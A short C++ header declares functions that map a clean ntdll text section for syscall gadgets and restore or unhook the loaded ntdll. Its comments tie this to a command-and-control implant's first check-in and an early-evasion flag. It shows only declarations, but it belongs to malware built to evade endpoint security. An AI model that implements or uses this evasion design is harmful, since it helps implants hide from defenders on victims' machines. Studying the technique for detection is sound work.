#pragma once
#include <cstddef>
#include <cstdint>

namespace unhook {

// Map a private clean ntdll .text for syscall gadgets; does not patch loaded ntdll
// (safe for WinHTTP). Call restore only after first check-in unless C2_EARLY_EVASION.
bool bind_ntdll();
bool restore_ntdll_text();
bool unhook_ntdll(); // bind + restore

const std::uint8_t* clean_text();
std::size_t clean_text_size();
void* loaded_ntdll_base();

} // namespace unhook
